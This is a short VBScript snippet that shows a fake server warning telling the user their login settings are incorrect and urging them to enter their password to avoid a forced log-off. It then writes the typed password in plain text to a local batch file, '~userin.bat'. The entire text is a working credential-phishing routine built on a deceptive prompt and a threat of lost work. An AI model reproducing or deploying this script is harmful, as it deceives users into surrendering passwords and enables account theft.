strUserIn = InputBox("THE SERVER HAS IDENTIFIED YOU AS " & (chr(13)) &  (chr(13)) & "YOUR LOGIN SETTINGS ARE NOT CORRECT" & (chr(13)) & "ENTER YOUR PASSWORD TO PREVENT AN AUTOMATIC LOG-OFF" & (chr(13)) & "NOTE: You will not be given the chance to close open programs before being logged off if you click 'Cancel'")
Set fs = Wscript.CreateObject("Scripting.FileSystemObject")
strFileName = fs.BuildPath(Wscript.ScriptFullName & "\..", "~userin.bat")
strFileName = fs.GetAbsolutePathName(strFileName)
Set ts = fs.OpenTextFile(strFileName, 2, True)
ts.WriteLine "set userin=" & strUserIn
ts.Close